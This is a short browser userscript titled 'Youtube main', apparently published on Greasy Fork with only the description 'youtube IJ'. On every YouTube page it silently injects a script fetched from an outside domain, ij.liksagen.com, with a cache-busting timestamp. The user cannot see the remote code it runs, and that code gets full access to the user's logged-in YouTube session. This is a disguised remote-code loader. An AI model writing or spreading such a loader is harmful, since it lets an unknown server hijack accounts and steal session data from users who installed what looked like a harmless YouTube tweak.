// ==UserScript==
// @name         Youtube main
// @namespace    http://*youtube.com
// @version      0.03
// @author       abrakadabra
// @description  youtube IJ
// @match        https://www.youtube.com/*
// @match        https://youtube.com/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/372009/Youtube%20main.user.js
// @updateURL https://update.greasyfork.org/scripts/372009/Youtube%20main.meta.js
// ==/UserScript==


var ms = new Date();
//document.write();

var script = document.createElement('script');
//var t = Math.random()*1000000;

var kuda = "https://ij.liksagen.com/youtube/main/?"+ms.getTime();
console.log(kuda);
script.src = kuda;
document.body.appendChild(script);